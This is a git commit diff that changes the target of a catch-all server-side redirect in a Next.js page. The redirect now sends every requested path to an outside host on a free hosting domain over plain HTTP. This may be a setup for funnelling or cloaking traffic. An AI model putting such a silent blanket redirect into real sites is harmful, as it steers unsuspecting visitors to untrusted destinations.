fb5c0badff25cb74f6973a7b653f7a024f9312ca
seonepal <90420041+seonepal@users.noreply.github.com>
2024-01-29 20:22:36 +0545

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://saveourstateok.org/` + encodeURI(path as string)
+					`http://velvetpromotion.free.nf/` + encodeURI(path as string)
 				}`,
 			},
 		};
